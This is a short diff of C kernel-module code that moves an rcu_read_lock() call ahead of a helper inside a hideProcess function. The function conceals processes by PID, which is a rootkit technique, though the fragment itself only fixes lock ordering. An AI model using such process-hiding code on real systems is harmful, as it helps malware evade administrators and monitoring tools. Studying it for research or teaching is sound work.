@@ -77,9 +77,10 @@ int hideProcess(int pidNumber) {
 		printError("Failed to hide process. Too may processes are hidden.\n");
 		result = -1;
 	} else {
+		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
+
 		RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
 
-		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
 		if (hiddenTask != NULL) {
 			result = -1;
